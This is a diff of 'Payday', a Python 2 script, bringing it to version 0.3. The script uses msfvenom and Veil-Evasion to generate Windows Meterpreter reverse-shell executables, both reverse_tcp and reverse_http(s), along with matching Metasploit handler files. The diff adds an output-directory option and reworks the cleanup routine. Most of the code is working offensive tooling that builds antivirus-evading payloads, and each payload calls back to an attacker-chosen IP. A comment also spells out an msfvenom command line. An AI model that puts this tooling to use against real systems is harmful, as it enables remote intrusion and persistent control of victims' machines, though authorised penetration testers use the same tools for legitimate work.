@@ -1,10 +1,12 @@
 #!/usr/bin/python
 # Author : Matt Lorentzen
-
+# version 0.3
 
 import os, sys, time, argparse
 
 def banner():
+
+
 	banner = """
                        _             
  _ __   __ _ _   _  __| | __ _ _   _ 
@@ -12,20 +14,19 @@ def banner():
 | |_) | (_| | |_| | (_| | (_| | |_| |
 | .__/ \__,_|\__, |\__,_|\__,_|\__, |
 |_|          |___/             |___/ 
-
-	"""	
+							
+"""
 	print redtxt(banner)
 
-def msf_payloads(ip):
+def msf_payloads(ip, output_dir):
 	# Payloads Dictionary
 	payloads = []
-	#appends payloads with nested 4 value list for dynamic parm calling
-	payloads.append(["windows/x64/meterpreter/reverse_tcp", 443, "exe", "metrev64.exe"])
+
 	payloads.append(["windows/meterpreter/reverse_tcp",443, "exe", "metrev.exe"])
 	payloads.append(["windows/meterpreter/reverse_http",443, "exe", "methttp.exe"])
 	payloads.append(["windows/meterpreter/reverse_https",443, "exe", "methttps.exe"])
 	payloads.append(["windows/x64/meterpreter/reverse_tcp",443, "exe-service" , "serv64.exe"])
-	payloads.append(["windows/meterpreter/reverse_tcp", 443, "exe-service" ,"serv64.exe"])
+	payloads.append(["windows/meterpreter/reverse_tcp", 443, "exe-service" ,"serv.exe"])
 
 	#./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
 	
@@ -35,7 +36,7 @@ def msf_payloads(ip):
 		lport = str(parms[1])
 		output_type = parms[2]
 		ext = parms[3]
-		base = "/root/payloads/windows/"
+		base = output_dir
 		venom_cmd = "msfvenom.framework -p " + payload + " LHOST=" + ip + " LPORT=" + lport + " -f " + output_type + " -o " + base + ext
 		print "[!] Generating : " + bluetxt(payload)
 		os.system(venom_cmd)
@@ -50,11 +51,13 @@ def msf_payloads(ip):
 		handler_file.write("set LHOST " + ip + "\n")
 		handler_file.write("exploit -j -z\n")
 		handler_file.close()
-		print "[!] Generated : " + yellowtxt(handler)
+		print "[!] Generated : " + yellowtxt(handler) + "\n\n"
 
 
-def veil_payloads(ip):
+def veil_payloads(ip, output_dir, move_payloads):
 	""" Takes local IP address as LHOST parm and builds Veil payloads"""
+	# Veil doesn't have a custom output directory option and the default path gets pulled from the config file
+	# hacky approach :: copy each generated payload and hander in to the custom output directory if it is supplied
 	veil_script = "/root/tools/pentest/Veil/Veil-Evasion/./Veil-Evasion.py "
 	#start empty list to hold
 	payloads = []
@@ -70,21 +73,52 @@ def veil_payloads(ip):
 		payload = parms[0]
 		lport = str(parms[1])
 		output = parms[2]
-		command = ("-p " + payload + " -c LHOST=" + lhost + " LPORT=" + lport + " -o " + output)
+		command = ("-p " + payload + " -c LHOST=" + lhost + " LPORT=" + lport + " -o " + output + " --overwrite")
 		os.system(veil_script + command)
 		time.sleep(2)
+		# if using a custom output directory, veil doesn't have an option to specify the base directory as it gets this from the conf file
+		# payload generated above has unique 'base' name - access the list and check the boolean flag that is pushed in
+		# if this is true, move the file/handler into the custom output directory so that all payloads are in custom location
+		if move_payloads == True:
+			# move payload
+			os.system("mv /root/payloads/windows/" + output + ".exe "  + output_dir)
+			# move handler
+			os.system("mv /root/payloads/windows/handlers/" + output + "_handler.rc " + output_dir + "handlers")
+
+
 
 def clean(payload_path):
 	""" Cleans out directory """
-	# clean out generated payloads
+	# start with default Veil direcory - gets rid of hashes etc
+	os.system("/root/tools/pentest/Veil/Veil-Evasion/./Veil-Evasion.py --clean")
+	os.system("clear")
+ 	print yellowtxt("[!] Now cleaning default output directory\n")	
+	# clean out generated payloads in default or custom directory
 	for file in os.listdir(payload_path):
 		file = payload_path + file
 		if os.path.isfile(file):
-			print "Removing " + bluetxt(file)
+			print "[!] Removing " + bluetxt(file)
 			os.remove(file)
-	# Cleaning out Veil Payload Directory	
-	os.system("/root/tools/pentest/Veil/Veil-Evasion/./Veil-Evasion.py --clean")
 	
+
+
+def get_payload_output(payload_output_dir):
+	""" Builds directory structure if output option is supplied """
+	output_dir = payload_output_dir
+	# check to see if the trailing slash has been added to the path : ie /root/path
+	if not output_dir.endswith("/"):
+		output_dir = output_dir + "/"
+	
+	# creates the structure if it doesn't exist
+	if not os.path.isdir(output_dir):
+		print yellowtxt("[!] Creating output directory structure")
+		os.mkdir(output_dir)
+		os.chdir(output_dir)
+		os.mkdir('handlers')
+
+	return output_dir
+		
+
 
 ###############################
 ### 	Helper Functions	###
@@ -120,26 +154,51 @@ def bluetxt(text2colour):
 
 
 def Main():
+	# program version
+	version = 0.3
 	banner()
-	parser = argparse.ArgumentParser(description="Payday File Options - Takes the IP Address and then builds meterpreter windows payloads using msfvenom and veil.\nOutputs to '/root/payloads/windows/'")
+
+	parser = argparse.ArgumentParser(description="Payday Payload Generator :: Takes the IP Address and then builds meterpreter windows payloads using msfvenom and veil.\nOutputs to '/root/payloads/windows/' by default.")
 	parser.add_argument("--veil", action="store_true", help='Generate Veil Payloads')
 	parser.add_argument("--msf", action="store_true", help='Generate MSF Payloads')
 	parser.add_argument("--clean", action="store_true", help="Cleans out existing files in the output directory")
+	parser.add_argument("--output", help="Specify new output directory.")
 	parser.add_argument("--ip", help='Specify Local IP Address for reverse connections')
-
 	args = parser.parse_args()
+
+	# default variable setup
 	ip = args.ip
+	output_dir = ""
+	move_payloads = False
+
+	# set up default path
+	if args.output:
+		output = args.output
+		output_dir = get_payload_output(output)
+		move_payloads = True
+
+	else:
+		# default directory output :: Veil config points to the this location
+		output_dir = "/root/payloads/windows/"	
+
 	if args.msf:
-		print yellowtxt("Encoding MSF Payloads")
-		msf_payloads(ip)
+		print yellowtxt("[!] Encoding MSF Payloads")
+		msf_payloads(ip, output_dir)
+	
 	if args.veil:
-		print yellowtxt("Encoding Veil payloads")
-		veil_payloads(ip)
+		print yellowtxt("[!] Encoding Veil payloads")
+		veil_payloads(ip ,output_dir, move_payloads)
+
 	if args.clean:
-		payload_paths = ["/root/payloads/windows/","/root/payloads/windows/handlers/"]
-		print redtxt("Cleaning out Payload and Handler File directories")
-		for payload_path in payload_paths:
-			clean(payload_path)
+		if args.output:
+			output_dir = get_payload_output(output)
+			print redtxt("Cleaning out Payload and Handler File directories in : ") + yellowtxt(output_dir)
+			clean(output_dir)
+		else:
+			payload_paths = ["/root/payloads/windows/","/root/payloads/windows/handlers/"]
+			print redtxt("Cleaning out Payload and Handler File directories")
+			for payload_path in payload_paths:
+				clean(payload_path)
 
 
 if __name__ == "__main__":
